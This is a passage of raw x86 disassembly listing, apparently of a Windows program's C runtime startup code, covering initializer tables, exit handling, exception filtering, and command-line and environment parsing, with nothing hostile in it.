  422c96:	mov    ecx,DWORD PTR [esi]
  422c98:	test   ecx,ecx
  422c9a:	je     0x422c9e
  422c9c:	call   ecx
  422c9e:	add    esi,0x4
  422ca1:	cmp    esi,edi
  422ca3:	jb     0x422c92
  422ca5:	test   eax,eax
  422ca7:	jne    0x422cd5
  422ca9:	push   0x4237a1
  422cae:	call   0x423c20
  422cb3:	mov    esi,0x42a000
  422cb8:	mov    eax,esi
  422cba:	mov    edi,0x42a008
  422cbf:	cmp    eax,edi
  422cc1:	pop    ecx
  422cc2:	jae    0x422cd3
  422cc4:	mov    eax,DWORD PTR [esi]
  422cc6:	test   eax,eax
  422cc8:	je     0x422ccc
  422cca:	call   eax
  422ccc:	add    esi,0x4
  422ccf:	cmp    esi,edi
  422cd1:	jb     0x422cc4
  422cd3:	xor    eax,eax
  422cd5:	pop    edi
  422cd6:	pop    esi
  422cd7:	ret    
  422cd8:	push   ebp
  422cd9:	mov    ebp,esp
  422cdb:	push   esi
  422cdc:	push   edi
  422cdd:	push   0x8
  422cdf:	call   0x423b0f
  422ce4:	xor    esi,esi
  422ce6:	inc    esi
  422ce7:	cmp    DWORD PTR ds:0x464da4,esi
  422ced:	pop    ecx
  422cee:	jne    0x422d00
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	call   DWORD PTR ds:0x428074
  422cf9:	push   eax
  422cfa:	call   DWORD PTR ds:0x428070
  422d00:	cmp    DWORD PTR [ebp+0xc],0x0
  422d04:	mov    al,BYTE PTR [ebp+0x10]
  422d07:	mov    DWORD PTR ds:0x464da0,esi
  422d0d:	mov    ds:0x464d9c,al
  422d12:	jne    0x422d66
  422d14:	mov    ecx,DWORD PTR ds:0x465508
  422d1a:	test   ecx,ecx
  422d1c:	je     0x422d47
  422d1e:	mov    eax,ds:0x465504
  422d23:	sub    eax,0x4
  422d26:	cmp    eax,ecx
  422d28:	jmp    0x422d40
  422d2a:	mov    eax,DWORD PTR [eax]
  422d2c:	test   eax,eax
  422d2e:	je     0x422d32
  422d30:	call   eax
  422d32:	mov    eax,ds:0x465504
  422d37:	sub    eax,0x4
  422d3a:	cmp    eax,DWORD PTR ds:0x465508
  422d40:	mov    ds:0x465504,eax
  422d45:	jae    0x422d2a
  422d47:	mov    eax,0x42a01c
  422d4c:	mov    esi,0x42a020
  422d51:	cmp    eax,esi
  422d53:	mov    edi,eax
  422d55:	jae    0x422d66
  422d57:	mov    eax,DWORD PTR [edi]
  422d59:	test   eax,eax
  422d5b:	je     0x422d5f
  422d5d:	call   eax
  422d5f:	add    edi,0x4
  422d62:	cmp    edi,esi
  422d64:	jb     0x422d57
  422d66:	mov    eax,0x42a024
  422d6b:	mov    esi,0x42a028
  422d70:	cmp    eax,esi
  422d72:	mov    edi,eax
  422d74:	jae    0x422d85
  422d76:	mov    eax,DWORD PTR [edi]
  422d78:	test   eax,eax
  422d7a:	je     0x422d7e
  422d7c:	call   eax
  422d7e:	add    edi,0x4
  422d81:	cmp    edi,esi
  422d83:	jb     0x422d76
  422d85:	cmp    DWORD PTR [ebp+0x10],0x0
  422d89:	pop    edi
  422d8a:	pop    esi
  422d8b:	je     0x422d96
  422d8d:	push   0x8
  422d8f:	call   0x423a7b
  422d94:	jmp    0x422da8
  422d96:	push   DWORD PTR [ebp+0x8]
  422d99:	mov    DWORD PTR ds:0x464da4,0x1
  422da3:	call   0x422c31
  422da8:	pop    ecx
  422da9:	pop    ebp
  422daa:	ret    
  422dab:	push   0x0
  422dad:	push   0x0
  422daf:	push   DWORD PTR [esp+0xc]
  422db3:	call   0x422cd8
  422db8:	add    esp,0xc
  422dbb:	ret    
  422dbc:	push   0x0
  422dbe:	push   0x1
  422dc0:	push   DWORD PTR [esp+0xc]
  422dc4:	call   0x422cd8
  422dc9:	add    esp,0xc
  422dcc:	ret    
  422dcd:	push   0x1
  422dcf:	push   0x0
  422dd1:	push   0x0
  422dd3:	call   0x422cd8
  422dd8:	add    esp,0xc
  422ddb:	ret    
  422ddc:	push   0x1
  422dde:	push   0x1
  422de0:	push   0x0
  422de2:	call   0x422cd8
  422de7:	add    esp,0xc
  422dea:	ret    
  422deb:	push   ebp
  422dec:	mov    ebp,esp
  422dee:	sub    esp,0x10c
  422df4:	mov    eax,ds:0x4646c0
  422df9:	xor    eax,DWORD PTR [ebp+0x4]
  422dfc:	mov    ecx,DWORD PTR [ebp+0x8]
  422dff:	push   ebx
  422e00:	push   esi
  422e01:	mov    DWORD PTR [ebp-0x4],eax
  422e04:	xor    edx,edx
  422e06:	push   edi
  422e07:	xor    eax,eax
  422e09:	cmp    ecx,DWORD PTR [eax*8+0x464458]
  422e10:	je     0x422e18
  422e12:	inc    eax
  422e13:	cmp    eax,0x12
  422e16:	jb     0x422e09
  422e18:	mov    esi,eax
  422e1a:	shl    esi,0x3
  422e1d:	cmp    ecx,DWORD PTR [esi+0x464458]
  422e23:	jne    0x422f4c
  422e29:	mov    eax,ds:0x464d5c
  422e2e:	cmp    eax,0x1
  422e31:	je     0x422f27
  422e37:	cmp    eax,edx
  422e39:	jne    0x422e48
  422e3b:	cmp    DWORD PTR ds:0x464450,0x1
  422e42:	je     0x422f27
  422e48:	cmp    ecx,0xfc
  422e4e:	je     0x422f4c
  422e54:	push   0x104
  422e59:	lea    eax,[ebp-0x10c]
  422e5f:	push   eax
  422e60:	push   edx
  422e61:	mov    BYTE PTR [ebp-0x8],dl
  422e64:	call   DWORD PTR ds:0x428080
  422e6a:	test   eax,eax
  422e6c:	jne    0x422e81
  422e6e:	lea    eax,[ebp-0x10c]
  422e74:	push   0x4284dc
  422e79:	push   eax
  422e7a:	call   0x423d30
  422e7f:	pop    ecx
  422e80:	pop    ecx
  422e81:	lea    eax,[ebp-0x10c]
  422e87:	push   eax
  422e88:	lea    edi,[ebp-0x10c]
  422e8e:	call   0x423f60
  422e93:	inc    eax
  422e94:	cmp    eax,0x3c
  422e97:	pop    ecx
  422e98:	jbe    0x422ec3
  422e9a:	lea    eax,[ebp-0x10c]
  422ea0:	push   eax
  422ea1:	call   0x423f60
  422ea6:	mov    edi,eax
  422ea8:	lea    eax,[ebp-0x10c]
  422eae:	sub    eax,0x3b
  422eb1:	push   0x3
  422eb3:	add    edi,eax
  422eb5:	push   0x4284d8
  422eba:	push   edi
  422ebb:	call   0x423e30
  422ec0:	add    esp,0x10
  422ec3:	push   edi
  422ec4:	call   0x423f60
  422ec9:	push   DWORD PTR [esi+0x46445c]
  422ecf:	mov    ebx,eax
  422ed1:	call   0x423f60
  422ed6:	lea    eax,[ebx+eax*1+0x1c]
  422eda:	pop    ecx
  422edb:	add    eax,0x3
  422ede:	pop    ecx
  422edf:	and    eax,0xfffffffc
  422ee2:	call   0x4239a0
  422ee7:	mov    ebx,esp
  422ee9:	push   0x4284bc
  422eee:	push   ebx
  422eef:	call   0x423d30
  422ef4:	push   edi
  422ef5:	push   ebx
  422ef6:	call   0x423d40
  422efb:	push   0x4284b8
  422f00:	push   ebx
  422f01:	call   0x423d40
  422f06:	push   DWORD PTR [esi+0x46445c]
  422f0c:	push   ebx
  422f0d:	call   0x423d40
  422f12:	push   0x12010
  422f17:	push   0x428490
  422f1c:	push   ebx
  422f1d:	call   0x423c32
  422f22:	add    esp,0x2c
  422f25:	jmp    0x422f4c
  422f27:	push   edx
  422f28:	lea    eax,[ebp+0x8]
  422f2b:	push   eax
  422f2c:	lea    esi,[esi+0x46445c]
  422f32:	push   DWORD PTR [esi]
  422f34:	call   0x423f60
  422f39:	pop    ecx
  422f3a:	push   eax
  422f3b:	push   DWORD PTR [esi]
  422f3d:	push   0xfffffff4
  422f3f:	call   DWORD PTR ds:0x42807c
  422f45:	push   eax
  422f46:	call   DWORD PTR ds:0x428078
  422f4c:	lea    esp,[ebp-0x118]
  422f52:	mov    ecx,DWORD PTR [ebp-0x4]
  422f55:	xor    ecx,DWORD PTR [ebp+0x4]
  422f58:	call   0x42401c
  422f5d:	pop    edi
  422f5e:	pop    esi
  422f5f:	pop    ebx
  422f60:	leave  
  422f61:	ret    
  422f62:	mov    eax,ds:0x464d5c
  422f67:	cmp    eax,0x1
  422f6a:	je     0x422f79
  422f6c:	test   eax,eax
  422f6e:	jne    0x422f9a
  422f70:	cmp    DWORD PTR ds:0x464450,0x1
  422f77:	jne    0x422f9a
  422f79:	push   0xfc
  422f7e:	call   0x422deb
  422f83:	mov    eax,ds:0x464da8
  422f88:	test   eax,eax
  422f8a:	pop    ecx
  422f8b:	je     0x422f8f
  422f8d:	call   eax
  422f8f:	push   0xff
  422f94:	call   0x422deb
  422f99:	pop    ecx
  422f9a:	ret    
  422f9b:	push   ebp
  422f9c:	mov    ebp,esp
  422f9e:	push   ecx
  422f9f:	push   ebx
  422fa0:	push   esi
  422fa1:	push   edi
  422fa2:	call   0x423803
  422fa7:	mov    edi,DWORD PTR [ebp+0x8]
  422faa:	mov    esi,eax
  422fac:	mov    edx,DWORD PTR [esi+0x54]
  422faf:	mov    eax,ds:0x46456c
  422fb4:	mov    ecx,edx
  422fb6:	cmp    DWORD PTR [ecx],edi
  422fb8:	je     0x422fc7
  422fba:	lea    ebx,[eax+eax*2]
  422fbd:	add    ecx,0xc
  422fc0:	lea    ebx,[edx+ebx*4]
  422fc3:	cmp    ecx,ebx
  422fc5:	jb     0x422fb6
  422fc7:	lea    eax,[eax+eax*2]
  422fca:	lea    eax,[edx+eax*4]
  422fcd:	cmp    ecx,eax
  422fcf:	jae    0x422fd5
  422fd1:	cmp    DWORD PTR [ecx],edi
  422fd3:	je     0x422fd7
  422fd5:	xor    ecx,ecx
  422fd7:	test   ecx,ecx
  422fd9:	je     0x4230f1
  422fdf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fe2:	test   ebx,ebx
  422fe4:	mov    DWORD PTR [ebp+0x8],ebx
  422fe7:	je     0x4230f1
  422fed:	cmp    ebx,0x5
  422ff0:	jne    0x422ffe
  422ff2:	and    DWORD PTR [ecx+0x8],0x0
  422ff6:	xor    eax,eax
  422ff8:	inc    eax
  422ff9:	jmp    0x4230fa
  422ffe:	cmp    ebx,0x1
  423001:	je     0x4230ec
  423007:	mov    eax,DWORD PTR [esi+0x58]
  42300a:	mov    DWORD PTR [ebp-0x4],eax
  42300d:	mov    eax,DWORD PTR [ebp+0xc]
  423010:	mov    DWORD PTR [esi+0x58],eax
  423013:	mov    eax,DWORD PTR [ecx+0x4]
  423016:	cmp    eax,0x8
  423019:	jne    0x4230de
  42301f:	mov    edx,DWORD PTR ds:0x464560
  423025:	mov    eax,ds:0x464564
  42302a:	add    eax,edx
  42302c:	cmp    edx,eax
  42302e:	jge    0x423057
  423030:	lea    eax,[edx+edx*2]
  423033:	shl    eax,0x2
  423036:	mov    edi,DWORD PTR [esi+0x54]
  423039:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42303e:	mov    edi,DWORD PTR ds:0x464560
  423044:	mov    ebx,DWORD PTR ds:0x464564
  42304a:	inc    edx
  42304b:	add    ebx,edi
  42304d:	add    eax,0xc
  423050:	cmp    edx,ebx
  423052:	jl     0x423036
  423054:	mov    ebx,DWORD PTR [ebp+0x8]
  423057:	mov    ecx,DWORD PTR [ecx]
  423059:	cmp    ecx,0xc000008e
  42305f:	mov    edi,DWORD PTR [esi+0x5c]
  423062:	jne    0x42306d
  423064:	mov    DWORD PTR [esi+0x5c],0x83
  42306b:	jmp    0x4230d1
  42306d:	cmp    ecx,0xc0000090
  423073:	jne    0x42307e
  423075:	mov    DWORD PTR [esi+0x5c],0x81
  42307c:	jmp    0x4230d1
  42307e:	cmp    ecx,0xc0000091
  423084:	jne    0x42308f
  423086:	mov    DWORD PTR [esi+0x5c],0x84
  42308d:	jmp    0x4230d1
  42308f:	cmp    ecx,0xc0000093
  423095:	jne    0x4230a0
  423097:	mov    DWORD PTR [esi+0x5c],0x85
  42309e:	jmp    0x4230d1
  4230a0:	cmp    ecx,0xc000008d
  4230a6:	jne    0x4230b1
  4230a8:	mov    DWORD PTR [esi+0x5c],0x82
  4230af:	jmp    0x4230d1
  4230b1:	cmp    ecx,0xc000008f
  4230b7:	jne    0x4230c2
  4230b9:	mov    DWORD PTR [esi+0x5c],0x86
  4230c0:	jmp    0x4230d1
  4230c2:	cmp    ecx,0xc0000092
  4230c8:	jne    0x4230d1
  4230ca:	mov    DWORD PTR [esi+0x5c],0x8a
  4230d1:	push   DWORD PTR [esi+0x5c]
  4230d4:	push   0x8
  4230d6:	call   ebx
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x5c],edi
  4230dc:	jmp    0x4230e5
  4230de:	and    DWORD PTR [ecx+0x8],0x0
  4230e2:	push   eax
  4230e3:	call   ebx
  4230e5:	mov    eax,DWORD PTR [ebp-0x4]
  4230e8:	pop    ecx
  4230e9:	mov    DWORD PTR [esi+0x58],eax
  4230ec:	or     eax,0xffffffff
  4230ef:	jmp    0x4230fa
  4230f1:	push   DWORD PTR [ebp+0xc]
  4230f4:	call   DWORD PTR ds:0x428084
  4230fa:	pop    edi
  4230fb:	pop    esi
  4230fc:	pop    ebx
  4230fd:	leave  
  4230fe:	ret    
  4230ff:	cmp    DWORD PTR ds:0x46550c,0x0
  423106:	jne    0x42310d
  423108:	call   0x42453c
  42310d:	push   esi
  42310e:	mov    esi,DWORD PTR ds:0x465514
  423114:	test   esi,esi
  423116:	jne    0x42311f
  423118:	mov    esi,0x4284f3
  42311d:	jmp    0x423164
  42311f:	mov    al,BYTE PTR [esi]
  423121:	cmp    al,0x22
  423123:	jne    0x42314d
  423125:	inc    esi
  423126:	mov    al,BYTE PTR [esi]
  423128:	cmp    al,0x22
  42312a:	je     0x42315d
  42312c:	test   al,al
  42312e:	je     0x423146
  423130:	movzx  eax,al
  423133:	push   eax
  423134:	call   0x42405b
  423139:	test   eax,eax
  42313b:	pop    ecx
  42313c:	je     0x42313f
  42313e:	inc    esi
  42313f:	inc    esi
  423140:	mov    al,BYTE PTR [esi]
  423142:	cmp    al,0x22
  423144:	jne    0x42312c
  423146:	cmp    BYTE PTR [esi],0x22
  423149:	jne    0x42315e
  42314b:	jmp    0x42315d
  42314d:	cmp    al,0x20
  42314f:	jbe    0x42315e
  423151:	inc    esi
  423152:	cmp    BYTE PTR [esi],0x20
  423155:	ja     0x423151
  423157:	jmp    0x42315e
  423159:	cmp    al,0x20
  42315b:	ja     0x423164
  42315d:	inc    esi
  42315e:	mov    al,BYTE PTR [esi]
  423160:	test   al,al
  423162:	jne    0x423159
  423164:	mov    eax,esi
  423166:	pop    esi
  423167:	ret    
  423168:	push   ebx
  423169:	xor    ebx,ebx
  42316b:	cmp    DWORD PTR ds:0x46550c,ebx
  423171:	push   esi
  423172:	push   edi
  423173:	jne    0x42317a
  423175:	call   0x42453c
  42317a:	mov    esi,DWORD PTR ds:0x464d54
  423180:	xor    edi,edi
  423182:	cmp    esi,ebx
  423184:	jne    0x423198
  423186:	jmp    0x4231b8
  423188:	cmp    al,0x3d
  42318a:	je     0x42318d
  42318c:	inc    edi
  42318d:	push   esi
  42318e:	call   0x423f60
  423193:	pop    ecx
  423194:	lea    esi,[esi+eax*1+0x1]
  423198:	mov    al,BYTE PTR [esi]
  42319a:	cmp    al,bl
  42319c:	jne    0x423188
  42319e:	lea    eax,[edi*4+0x4]
  4231a5:	push   eax
  4231a6:	call   0x424672
  4231ab:	mov    edi,eax
  4231ad:	cmp    edi,ebx
  4231af:	pop    ecx
  4231b0:	mov    DWORD PTR ds:0x464d84,edi
  4231b6:	jne    0x4231bd
  4231b8:	or     eax,0xffffffff
  4231bb:	jmp    0x423215
  4231bd:	mov    esi,DWORD PTR ds:0x464d54
  4231c3:	push   ebp
  4231c4:	jmp    0x4231f0
  4231c6:	push   esi
  4231c7:	call   0x423f60
  4231cc:	mov    ebp,eax
  4231ce:	inc    ebp
  4231cf:	cmp    BYTE PTR [esi],0x3d
  4231d2:	pop    ecx
  4231d3:	je     0x4231ee
  4231d5:	push   ebp
  4231d6:	call   0x424672
  4231db:	cmp    eax,ebx
  4231dd:	pop    ecx
  4231de:	mov    DWORD PTR [edi],eax
  4231e0:	je     0x423219
  4231e2:	push   esi
  4231e3:	push   eax
  4231e4:	call   0x423d30
  4231e9:	pop    ecx
  4231ea:	pop    ecx
  4231eb:	add    edi,0x4
  4231ee:	add    esi,ebp
  4231f0:	cmp    BYTE PTR [esi],bl
  4231f2:	jne    0x4231c6
  4231f4:	push   DWORD PTR ds:0x464d54
  4231fa:	call   0x42455a
  4231ff:	mov    DWORD PTR ds:0x464d54,ebx
  423205:	mov    DWORD PTR [edi],ebx
  423207:	mov    DWORD PTR ds:0x465500,0x1
  423211:	xor    eax,eax
  423213:	pop    ecx
  423214:	pop    ebp
  423215:	pop    edi
  423216:	pop    esi
  423217:	pop    ebx
  423218:	ret    
  423219:	push   DWORD PTR ds:0x464d84
  42321f:	call   0x42455a
  423224:	mov    DWORD PTR ds:0x464d84,ebx
  42322a:	or     eax,0xffffffff
  42322d:	jmp    0x423213
  42322f:	push   ebp
  423230:	mov    ebp,esp
  423232:	push   ecx
  423233:	push   ebx
  423234:	mov    ebx,DWORD PTR [ebp+0xc]
  423237:	xor    edx,edx
  423239:	cmp    DWORD PTR [ebp+0x8],edx
  42323c:	push   edi
  42323d:	mov    DWORD PTR [esi],edx
  42323f:	mov    edi,ecx
  423241:	mov    DWORD PTR [ebx],0x1
  423247:	je     0x423252
  423249:	mov    ecx,DWORD PTR [ebp+0x8]
  42324c:	add    DWORD PTR [ebp+0x8],0x4
  423250:	mov    DWORD PTR [ecx],edi
  423252:	cmp    BYTE PTR [eax],0x22
  423255:	jne    0x423265
  423257:	xor    ecx,ecx
  423259:	test   edx,edx
  42325b:	sete   cl
  42325e:	inc    eax
  42325f:	mov    edx,ecx
  423261:	mov    cl,0x22
  423263:	jmp    0x423292
  423265:	inc    DWORD PTR [esi]
  423267:	test   edi,edi
  423269:	je     0x423270
  42326b:	mov    cl,BYTE PTR [eax]
  42326d:	mov    BYTE PTR [edi],cl
  42326f:	inc    edi
  423270:	mov    cl,BYTE PTR [eax]
  423272:	movzx  ebx,cl
  423275:	inc    eax
  423276:	test   BYTE PTR [ebx+0x4651c1],0x4
  42327d:	je     0x42328b
  42327f:	inc    DWORD PTR [esi]
  423281:	test   edi,edi
  423283:	je     0x42328a
  423285:	mov    bl,BYTE PTR [eax]
  423287:	mov    BYTE PTR [edi],bl
  423289:	inc    edi
  42328a:	inc    eax
  42328b:	test   cl,cl
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	je     0x4232c4
  423292:	test   edx,edx
  423294:	jne    0x423252
  423296:	cmp    cl,0x20
  423299:	je     0x4232a0
  42329b:	cmp    cl,0x9
  42329e:	jne    0x423252
  4232a0:	test   edi,edi
  4232a2:	je     0x4232a8
  4232a4:	and    BYTE PTR [edi-0x1],0x0
  4232a8:	and    DWORD PTR [ebp-0x4],0x0
  4232ac:	cmp    BYTE PTR [eax],0x0
  4232af:	je     0x42338b
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	cmp    cl,0x20
  4232ba:	je     0x4232c1
  4232bc:	cmp    cl,0x9
  4232bf:	jne    0x4232c7
  4232c1:	inc    eax
  4232c2:	jmp    0x4232b5
  4232c4:	dec    eax
  4232c5:	jmp    0x4232a8
  4232c7:	cmp    BYTE PTR [eax],0x0
  4232ca:	je     0x42338b
  4232d0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232d4:	je     0x4232df
  4232d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232d9:	add    DWORD PTR [ebp+0x8],0x4
  4232dd:	mov    DWORD PTR [ecx],edi
  4232df:	inc    DWORD PTR [ebx]
  4232e1:	xor    ebx,ebx
  4232e3:	inc    ebx
  4232e4:	xor    edx,edx
  4232e6:	jmp    0x4232ea
  4232e8:	inc    eax
  4232e9:	inc    edx
  4232ea:	cmp    BYTE PTR [eax],0x5c
  4232ed:	je     0x4232e8
  4232ef:	cmp    BYTE PTR [eax],0x22
  4232f2:	jne    0x42331a
  4232f4:	test   dl,0x1
  4232f7:	jne    0x423318
  4232f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232fd:	je     0x42330b
  4232ff:	lea    ecx,[eax+0x1]
  423302:	cmp    BYTE PTR [ecx],0x22
  423305:	jne    0x42330b
  423307:	mov    eax,ecx
  423309:	jmp    0x42330d
  42330b:	xor    ebx,ebx
  42330d:	xor    ecx,ecx
  42330f:	cmp    DWORD PTR [ebp-0x4],ecx
  423312:	sete   cl
  423315:	mov    DWORD PTR [ebp-0x4],ecx
  423318:	shr    edx,1
  42331a:	test   edx,edx
  42331c:	je     0x42332b
  42331e:	test   edi,edi
  423320:	je     0x423326
  423322:	mov    BYTE PTR [edi],0x5c
  423325:	inc    edi
  423326:	inc    DWORD PTR [esi]
  423328:	dec    edx
  423329:	jne    0x42331e
  42332b:	mov    cl,BYTE PTR [eax]
  42332d:	test   cl,cl
  42332f:	je     0x423379
  423331:	cmp    DWORD PTR [ebp-0x4],0x0
  423335:	jne    0x423341
  423337:	cmp    cl,0x20
  42333a:	je     0x423379
  42333c:	cmp    cl,0x9
  42333f:	je     0x423379
  423341:	test   ebx,ebx
  423343:	je     0x423373
  423345:	test   edi,edi
  423347:	je     0x423362
  423349:	movzx  edx,cl
  42334c:	test   BYTE PTR [edx+0x4651c1],0x4
  423353:	je     0x42335b
  423355:	mov    BYTE PTR [edi],cl
  423357:	inc    edi
  423358:	inc    eax
  423359:	inc    DWORD PTR [esi]
  42335b:	mov    cl,BYTE PTR [eax]
  42335d:	mov    BYTE PTR [edi],cl
  42335f:	inc    edi
  423360:	jmp    0x423371
  423362:	movzx  ecx,cl
  423365:	test   BYTE PTR [ecx+0x4651c1],0x4
  42336c:	je     0x423371
  42336e:	inc    eax
  42336f:	inc    DWORD PTR [esi]
  423371:	inc    DWORD PTR [esi]
  423373:	inc    eax
  423374:	jmp    0x4232e1
  423379:	test   edi,edi
  42337b:	je     0x423381
  42337d:	and    BYTE PTR [edi],0x0
  423380:	inc    edi
  423381:	inc    DWORD PTR [esi]
  423383:	mov    ebx,DWORD PTR [ebp+0xc]
  423386:	jmp    0x4232ac
  42338b:	mov    eax,DWORD PTR [ebp+0x8]
  42338e:	test   eax,eax
  423390:	je     0x423395
  423392:	and    DWORD PTR [eax],0x0
  423395:	inc    DWORD PTR [ebx]
  423397:	pop    edi
  423398:	pop    ebx
  423399:	leave  
  42339a:	ret    
  42339b:	push   ebp
  42339c:	mov    ebp,esp
  42339e:	push   ecx
  42339f:	push   ecx
  4233a0:	push   ebx
  4233a1:	push   esi
  4233a2:	push   edi
  4233a3:	xor    edi,edi
  4233a5:	cmp    DWORD PTR ds:0x46550c,edi
  4233ab:	jne    0x4233b2
  4233ad:	call   0x42453c
  4233b2:	and    BYTE PTR ds:0x464eb4,0x0
  4233b9:	push   0x104
  4233be:	mov    esi,0x464db0
  4233c3:	push   esi
  4233c4:	push   edi
  4233c5:	call   DWORD PTR ds:0x428080
  4233cb:	mov    eax,ds:0x465514
  4233d0:	cmp    eax,edi
  4233d2:	mov    DWORD PTR ds:0x464d94,esi
  4233d8:	je     0x4233e1
  4233da:	cmp    BYTE PTR [eax],0x0
  4233dd:	mov    ebx,eax
  4233df:	jne    0x4233e3
  4233e1:	mov    ebx,esi
  4233e3:	lea    eax,[ebp-0x4]
  4233e6:	push   eax
  4233e7:	push   edi
  4233e8:	lea    esi,[ebp-0x8]
  4233eb:	xor    ecx,ecx
  4233ed:	mov    eax,ebx
  4233ef:	call   0x42322f
  4233f4:	mov    esi,DWORD PTR [ebp-0x4]
  4233f7:	mov    eax,DWORD PTR [ebp-0x8]
  4233fa:	shl    esi,0x2
  4233fd:	add    eax,esi
  4233ff:	push   eax
  423400:	call   0x424672
  423405:	mov    edi,eax
  423407:	add    esp,0xc
  42340a:	test   edi,edi
  42340c:	jne    0x423413
  42340e:	or     eax,0xffffffff
  423411:	jmp    0x423438
  423413:	lea    eax,[ebp-0x4]
  423416:	push   eax
  423417:	lea    ecx,[esi+edi*1]
  42341a:	push   edi
  42341b:	lea    esi,[ebp-0x8]
  42341e:	mov    eax,ebx
  423420:	call   0x42322f
  423425:	mov    eax,DWORD PTR [ebp-0x4]
  423428:	dec    eax
  423429:	pop    ecx
  42342a:	mov    ds:0x464d78,eax
  42342f:	pop    ecx
  423430:	mov    DWORD PTR ds:0x464d7c,edi
  423436:	xor    eax,eax
  423438:	pop    edi
  423439:	pop    esi
  42343a:	pop    ebx
  42343b:	leave  
  42343c:	ret    
  42343d:	push   ecx
  42343e:	push   ecx
  42343f:	mov    eax,ds:0x464eb8
  423444:	push   ebx
  423445:	push   ebp
  423446:	push   esi
  423447:	push   edi
  423448:	mov    edi,DWORD PTR ds:0x428094
  42344e:	xor    ebx,ebx
  423450:	xor    esi,esi
  423452:	cmp    eax,ebx
  423454:	push   0x2
  423456:	pop    ebp
  423457:	jne    0x423486
  423459:	call   edi
  42345b:	mov    esi,eax
  42345d:	cmp    esi,ebx
  42345f:	je     0x42346d
  423461:	mov    DWORD PTR ds:0x464eb8,0x1
  42346b:	jmp    0x42348b
  42346d:	call   DWORD PTR ds:0x428034
  423473:	cmp    eax,0x78
  423476:	jne    0x423481
  423478:	mov    eax,ebp
  42347a:	mov    ds:0x464eb8,eax
  42347f:	jmp    0x423486
  423481:	mov    eax,ds:0x464eb8
  423486:	cmp    eax,0x1
  423489:	jne    0x423508
  42348b:	cmp    esi,ebx
  42348d:	jne    0x423497
  42348f:	call   edi
  423491:	mov    esi,eax
  423493:	cmp    esi,ebx
  423495:	je     0x423510
  423497:	cmp    WORD PTR [esi],bx
  42349a:	mov    eax,esi
  42349c:	je     0x4234ac
  42349e:	add    eax,ebp
  4234a0:	cmp    WORD PTR [eax],bx
  4234a3:	jne    0x42349e
  4234a5:	add    eax,ebp
  4234a7:	cmp    WORD PTR [eax],bx
  4234aa:	jne    0x42349e
  4234ac:	mov    edi,DWORD PTR ds:0x428090
  4234b2:	push   ebx
  4234b3:	push   ebx
  4234b4:	push   ebx
  4234b5:	sub    eax,esi
  4234b7:	push   ebx
  4234b8:	sar    eax,1
  4234ba:	inc    eax
  4234bb:	push   eax
  4234bc:	push   esi
  4234bd:	push   ebx
  4234be:	push   ebx
  4234bf:	mov    DWORD PTR [esp+0x34],eax
  4234c3:	call   edi
  4234c5:	mov    ebp,eax
  4234c7:	cmp    ebp,ebx
  4234c9:	je     0x4234fd
  4234cb:	push   ebp
  4234cc:	call   0x424672
  4234d1:	cmp    eax,ebx
  4234d3:	pop    ecx
  4234d4:	mov    DWORD PTR [esp+0x10],eax
  4234d8:	je     0x4234fd
  4234da:	push   ebx
  4234db:	push   ebx
  4234dc:	push   ebp
  4234dd:	push   eax
  4234de:	push   DWORD PTR [esp+0x24]
  4234e2:	push   esi
  4234e3:	push   ebx
  4234e4:	push   ebx
  4234e5:	call   edi
  4234e7:	test   eax,eax
  4234e9:	jne    0x4234f9
  4234eb:	push   DWORD PTR [esp+0x10]
  4234ef:	call   0x42455a
  4234f4:	pop    ecx
  4234f5:	mov    DWORD PTR [esp+0x10],ebx
  4234f9:	mov    ebx,DWORD PTR [esp+0x10]
  4234fd:	push   esi
  4234fe:	call   DWORD PTR ds:0x42808c
  423504:	mov    eax,ebx
  423506:	jmp    0x423558
  423508:	cmp    eax,ebp
  42350a:	je     0x423514
  42350c:	cmp    eax,ebx
  42350e:	je     0x423514
  423510:	xor    eax,eax
  423512:	jmp    0x423558
  423514:	call   DWORD PTR ds:0x428018
  42351a:	mov    esi,eax
  42351c:	cmp    esi,ebx
  42351e:	je     0x423510
  423520:	cmp    BYTE PTR [esi],bl
  423522:	je     0x42352e
  423524:	inc    eax
  423525:	cmp    BYTE PTR [eax],bl
  423527:	jne    0x423524
  423529:	inc    eax
  42352a:	cmp    BYTE PTR [eax],bl
  42352c:	jne    0x423524
  42352e:	sub    eax,esi
  423530:	inc    eax
  423531:	mov    ebp,eax
  423533:	push   ebp
  423534:	call   0x424672
  423539:	mov    edi,eax
  42353b:	cmp    edi,ebx
  42353d:	pop    ecx
  42353e:	jne    0x423544
  423540:	xor    edi,edi
  423542:	jmp    0x42354f
  423544:	push   ebp
  423545:	push   esi
  423546:	push   edi
  423547:	call   0x424690
  42354c:	add    esp,0xc
  42354f:	push   esi
  423550:	call   DWORD PTR ds:0x428088
  423556:	mov    eax,edi
  423558:	pop    edi
  423559:	pop    esi
  42355a:	pop    ebp
  42355b:	pop    ebx
  42355c:	pop    ecx
  42355d:	pop    ecx
  42355e:	ret    
  42355f:	sub    esp,0x48
  423562:	push   ebx
  423563:	mov    ebx,0x480
  423568:	push   ebx
  423569:	call   0x424672
  42356e:	test   eax,eax
  423570:	pop    ecx
  423571:	jne    0x42357b
  423573:	or     eax,0xffffffff
  423576:	jmp    0x423758
  42357b:	mov    ds:0x465400,eax
  423580:	mov    DWORD PTR ds:0x4653e8,0x20
  42358a:	lea    ecx,[eax+0x480]
  423590:	jmp    0x4235b0
  423592:	and    BYTE PTR [eax+0x4],0x0
  423596:	or     DWORD PTR [eax],0xffffffff
  423599:	and    DWORD PTR [eax+0x8],0x0
  42359d:	mov    BYTE PTR [eax+0x5],0xa
  4235a1:	mov    ecx,DWORD PTR ds:0x465400
  4235a7:	add    eax,0x24
  4235aa:	add    ecx,0x480
  4235b0:	cmp    eax,ecx
  4235b2:	jb     0x423592
  4235b4:	push   ebp
  4235b5:	push   esi
  4235b6:	push   edi
  4235b7:	lea    eax,[esp+0x14]
  4235bb:	push   eax
  4235bc:	call   DWORD PTR ds:0x428060
  4235c2:	cmp    WORD PTR [esp+0x46],0x0
  4235c8:	je     0x4236b7
  4235ce:	mov    eax,DWORD PTR [esp+0x48]
